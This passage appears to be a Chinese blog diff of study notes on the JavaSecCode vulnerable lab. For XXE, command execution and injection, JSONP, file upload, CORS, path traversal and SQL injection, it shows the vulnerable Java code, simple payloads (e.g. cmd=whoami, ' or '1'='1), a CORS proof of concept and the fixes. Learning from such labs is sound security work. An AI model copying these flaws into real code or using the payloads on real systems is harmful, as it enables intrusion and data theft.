class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: remember-me&#x3D;YWRtaW46MTYwODcwOTM4MDEyODphMmM5Yjg1NjMwZDRkOTNhYTljMWZmMzQwNDk4ZjYzYg; XSRF-TOKEN&#x3D;3d1c0f17-c67b-4976-9dc1-c49a3c009bf7; JSESSIONID&#x3D;BBC40D3F2F6B4EEF42665B33CDB307F8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">    &lt;!ENTITY x &quot;First Param!&quot;&gt;</span><br><span class="line">    &lt;!ENTITY y &quot;Second Param!&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;x&gt;&amp;x;&lt;&#x2F;x&gt;&lt;y&gt;&amp;y;&lt;&#x2F;y&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
+
+<p>无回显，使用外带传输。</p>
+<ol>
+<li><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">JAVA常见的XXE漏洞写法和防御</a></li>
+<li><a href="http://www.lmxspace.com/2019/10/31/Java-XXE-%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">Java-XXE-总结</a></li>
+</ol>
+<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>直接命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;rce&#x2F;exec?cmd&#x3D;whoami</span><br></pre></td></tr></table></figure>
+
+<p>查看源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;&#x2F;rce&quot;) </span><br><span class="line">public class Rce &#123;</span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;exec&quot;)</span><br><span class="line">    public String CommandExec(String cmd) &#123;</span><br><span class="line">        Runtime run &#x3D; Runtime.getRuntime();</span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process p &#x3D; run.exec(cmd);</span><br><span class="line">            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (p.waitFor() !&#x3D; 0) &#123;</span><br><span class="line">                if (p.exitValue() &#x3D;&#x3D; 1)</span><br><span class="line">                    return &quot;Command exec failed!!&quot;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            inBr.close();</span><br><span class="line">            in.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return &quot;Except&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接收参数导致的命令执行漏洞</p>
+<h2 id="CmdInject-（命令注入）"><a href="#CmdInject-（命令注入）" class="headerlink" title="CmdInject （命令注入）"></a>CmdInject （命令注入）</h2><p>命令行直接进行拼接，可进行分割执行其他命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&quot;)</span><br><span class="line">public String codeInject(String filepath) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filepath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用管道符，分号等等（url编码）都可以进行拼接。</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image6.png" alt="image"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;host&quot;)</span><br><span class="line">public String codeInjectHost(HttpServletRequest request) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    String host &#x3D; request.getHeader(&quot;host&quot;);</span><br><span class="line">    logger.info(host);</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;curl &quot; + host&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里看代码是在HTTP请求的host中命令执行，但是不知道为什么不行</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image7.png" alt="image"></p>
+<p>接下来查看修复代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;codeinject&#x2F;sec&quot;)</span><br><span class="line">public String codeInjectSec(String filepath) throws IOException &#123;</span><br><span class="line">    String filterFilePath &#x3D; SecurityUtil.cmdFilter(filepath);</span><br><span class="line">    if (null &#x3D;&#x3D; filterFilePath) &#123;</span><br><span class="line">        return &quot;Bad boy. I got u.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmdList &#x3D; new String[]&#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls -la &quot; + filterFilePath&#125;;</span><br><span class="line">    ProcessBuilder builder &#x3D; new ProcessBuilder(cmdList);</span><br><span class="line">    builder.redirectErrorStream(true);</span><br><span class="line">    Process process &#x3D; builder.start();</span><br><span class="line">    return WebUtils.convertStreamToString(process.getInputStream());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>增加了一个SecurityUtil.cmdFilter()进行过滤，command+点击cmdFilter进入cmdFilter函数查看</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static String cmdFilter(String input) &#123;</span><br><span class="line">    if (!FILTER_PATTERN.matcher(input).matches()) &#123;</span><br><span class="line">        &#x2F;&#x2F; FILTER_PATTERN.matcher().matches()</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进看FILTER_PATTERN是怎么定义的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final Pattern FILTER_PATTERN &#x3D; Pattern.compile(&quot;^[a-zA-Z0-9_&#x2F;\\.-]+$&quot;);</span><br></pre></td></tr></table></figure>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image8.png" alt="image"></p>
+<h2 id="jsonp-劫持漏洞"><a href="#jsonp-劫持漏洞" class="headerlink" title="jsonp 劫持漏洞"></a>jsonp 劫持漏洞</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。当开发者使用不当时，攻击者可以恶意利用jsonp劫持数据。举例如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;JSONP 实例&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;divCustomers&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function callbackFunction(result, methodName)</span><br><span class="line">        &#123;</span><br><span class="line">            var html &#x3D; &#39;&lt;ul&gt;&#39;;</span><br><span class="line">            for(var i &#x3D; 0; i &lt; result.length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                html +&#x3D; &#39;&lt;li&gt;&#39; + result[i] + &#39;&lt;&#x2F;li&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            html +&#x3D; &#39;&lt;&#x2F;ul&gt;&#39;;</span><br><span class="line">            document.getElementById(&#39;divCustomers&#39;).innerHTML &#x3D; html;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;www.runoob.com&#x2F;try&#x2F;ajax&#x2F;jsonp.php?jsoncallback&#x3D;callbackFunction&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么在测试这个java-sec的jsonp时候，跳转的需要进行登陆</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>查看文件上传函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;&#x2F;upload&quot;)</span><br><span class="line">public String singleFileUpload(@RequestParam(&quot;file&quot;) MultipartFile file,</span><br><span class="line">                               RedirectAttributes redirectAttributes) &#123;</span><br><span class="line">    if (file.isEmpty()) &#123;</span><br><span class="line">        &#x2F;&#x2F; 赋值给uploadStatus.html里的动态参数message</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;Please select a file to upload&quot;);</span><br><span class="line">        return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        &#x2F;&#x2F; Get the file and save it somewhere</span><br><span class="line">        byte[] bytes &#x3D; file.getBytes();</span><br><span class="line">        Path path &#x3D; Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());</span><br><span class="line">        Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;,</span><br><span class="line">                &quot;You successfully uploaded &#39;&quot; + UPLOADED_FOLDER + file.getOriginalFilename() + &quot;&#39;&quot;);</span><br><span class="line"></span><br><span class="line">    &#125; catch (IOException e) &#123;</span><br><span class="line">        redirectAttributes.addFlashAttribute(&quot;message&quot;, &quot;upload failed&quot;);</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return &quot;redirect:&#x2F;file&#x2F;status&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。</p>
+<p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image9.png" alt="image"></p>
+<p>在如下的配置中，意味着任何服务都能访问资源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK</span><br><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用curl进行验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;www.xxxxx.com -H &quot;Origin: https:&#x2F;&#x2F;test.com&quot; -I</span><br></pre></td></tr></table></figure>
+
+<p>但是由于有cookie导致利用起来就很麻烦了，下面是没有cookie的POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">        window.onload &#x3D; function cors() &#123;</span><br><span class="line">        var xhttp &#x3D; new XMLHttpRequest();</span><br><span class="line">        xhttp.onreadystatechange &#x3D; function() &#123;</span><br><span class="line">        if (this.readyState &#x3D;&#x3D; 4 &amp;&amp; this.status &#x3D;&#x3D; 200) &#123;</span><br><span class="line">        document.getElementById(&quot;demo&quot;).innerHTML &#x3D;</span><br><span class="line">        alert(this.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xhttp.open(&quot;GET&quot;, &quot;http:&#x2F;&#x2F;www.sqllabs.com&#x2F;test.php&quot;, true);</span><br><span class="line">        xhttp.send();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;textarea id&#x3D;&quot;demo&quot;&gt;&lt;&#x2F;textarea&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<p>查看Java源码,设置路由，设置http头，直接返回信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private static String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;origin&quot;)</span><br><span class="line">public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin &#x3D; request.getHeader(&quot;origin&quot;);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); &#x2F;&#x2F; 设置Origin值为Header中获取到的</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  &#x2F;&#x2F; cookie</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>同理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;setHeader&quot;)</span><br><span class="line">public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>修复方式是使用@GetMapping进行设置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;webMvcConfigurer&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * spring security设置cors</span><br><span class="line"> * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行</span><br><span class="line"> * 代码：org&#x2F;joychou&#x2F;security&#x2F;WebSecurityConfig.java</span><br><span class="line"> *&#x2F;</span><br><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;httpCors&quot;)</span><br><span class="line">public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">    return token;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;sec&#x2F;checkOrigin&quot;)</span><br><span class="line">public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin &#x3D; request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">    &#x2F;&#x2F; 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">    if (origin !&#x3D; null &amp;&amp; SecurityUtil.checkURL(origin) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;Origin is not safe.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">    return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p><img src="https://www.shangzeng.club/2020/12/14/JavaSecCode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image10.png" alt="image"></p>
+<p>查看源码，就是直接读取文件并进行base64编码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;vul&quot;)</span><br><span class="line">public String getImage(String filepath) throws IOException &#123;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private String getImgBase64(String imgFile) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">    logger.info(&quot;Working directory: &quot; + System.getProperty(&quot;user.dir&quot;));</span><br><span class="line">    logger.info(&quot;File path: &quot; + imgFile);</span><br><span class="line"></span><br><span class="line">    File f &#x3D; new File(imgFile);</span><br><span class="line">    if (f.exists() &amp;&amp; !f.isDirectory()) &#123;</span><br><span class="line">        byte[] data &#x3D; Files.readAllBytes(Paths.get(imgFile));</span><br><span class="line">        return new String(Base64.encodeBase64(data));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;File doesn&#39;t exist or is not a file.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修复方式，过滤文件,使用正则表达式过滤</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;path_traversal&#x2F;sec&quot;)</span><br><span class="line">public String getImageSec(String filepath) throws IOException &#123;</span><br><span class="line">    if (SecurityUtil.pathFilter(filepath) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        logger.info(&quot;Illegal file path: &quot; + filepath);</span><br><span class="line">        return &quot;Bad boy. Illegal file path.&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return getImgBase64(filepath);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入SecurityUtil.pathFilter()进行查看,过滤了常见的函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public static String pathFilter(String filepath) &#123;</span><br><span class="line">    String temp &#x3D; filepath;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; use while to sovle multi urlencode</span><br><span class="line">    while (temp.indexOf(&#39;%&#39;) !&#x3D; -1) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            temp &#x3D; URLDecoder.decode(temp, &quot;utf-8&quot;);</span><br><span class="line">        &#125; catch (UnsupportedEncodingException e) &#123;</span><br><span class="line">            logger.info(&quot;Unsupported encoding exception: &quot; + filepath);</span><br><span class="line">            return null;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            logger.info(e.toString());</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (temp.contains(&quot;..&quot;) || temp.charAt(0) &#x3D;&#x3D; &#39;&#x2F;&#39;) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return filepath;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>搭建失败， 直接看代码，输入语句直接拼接进去，造成sql注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)</span><br><span class="line">public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connect to database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sqli vuln code</span><br><span class="line">        Statement statement &#x3D; con.createStatement();</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        ResultSet rs &#x3D; statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注入语句基本如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;sqli&#x2F;mybatis&#x2F;vuln01?username&#x3D;joychou&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>修复代码如下,直接让带入的为字符串，禁止进行执行</p>
